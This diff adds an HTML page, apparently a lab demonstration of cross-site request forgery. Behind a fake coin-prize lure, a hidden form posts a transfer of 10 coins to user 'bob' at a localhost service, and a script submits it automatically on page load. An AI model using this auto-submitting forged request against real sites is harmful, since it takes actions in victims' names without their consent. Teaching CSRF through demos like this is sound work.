@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Website</title>
+</head>
+<body>
+    <h1>You've won a free coin transfer!</h1>
+    <p>Click the button below to claim your coins.</p>
+    <form action="http://localhost:8000/transfer" method="POST">
+        <input type="hidden" name="to_user" value="bob"> <!-- The recipient username -->
+        <input type="hidden" name="amount" value="10"> <!-- Amount of coins -->
+        <button type="submit" style="display:none;">Claim Now</button>
+    </form>
+
+    <script>
+        // Auto-submit the form when the page loads (CSRF attack)
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
